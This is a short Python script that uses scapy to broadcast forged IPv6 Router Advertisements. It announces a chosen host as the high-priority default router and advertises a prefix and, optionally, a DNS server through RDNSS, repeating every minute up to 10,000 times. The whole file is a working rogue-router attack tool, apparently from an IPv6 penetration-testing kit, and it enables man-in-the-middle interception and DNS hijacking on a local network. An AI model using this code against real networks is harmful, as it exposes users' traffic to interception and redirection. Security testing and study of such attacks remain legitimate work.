#!/usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, getmacbyip6, \
    ICMPv6NDOptRDNSS
from scapy.sendrecv import send


def prefixRouter_RA(interface, smac, sip, prefix_len, prefix, router_lifetime, dns_ip):
    if smac == "":
        smac = getmacbyip6(sip)
    if router_lifetime == "":
        router_lifetime = 1800
    router_lifetime = int(router_lifetime)
    # Generate packets
    layer3 = IPv6(src=sip, dst="ff02::1")
    if dns_ip == "":
        packet1 = layer3 / ICMPv6ND_RA(prf="High", routerlifetime=router_lifetime) / \
                  ICMPv6NDOptPrefixInfo(prefixlen=prefix_len, validlifetime=0x6,
                                        preferredlifetime=0x6, prefix=prefix) / \
                  ICMPv6NDOptSrcLLAddr(lladdr=smac)
    else:
        packet1 = layer3 / ICMPv6ND_RA(prf="High", routerlifetime=router_lifetime) / \
                  ICMPv6NDOptPrefixInfo(prefixlen=prefix_len, validlifetime=0x6,
                                        preferredlifetime=0x6, prefix=prefix) / \
                  ICMPv6NDOptSrcLLAddr(lladdr=smac) / ICMPv6NDOptRDNSS(dns=[dns_ip])

    print("Periodical informing to the network that host " + sip + " is the default router and providing information "
                                                                   "about prefix and DNS server (possible) (press "
                                                                   "Ctrl C to stop the "
                                                                   "program)")
    if interface == "":
        send(packet1, count=10000, inter=60, verbose=False)
    else:
        send(packet1, count=10000, inter=60, verbose=False, iface=interface)
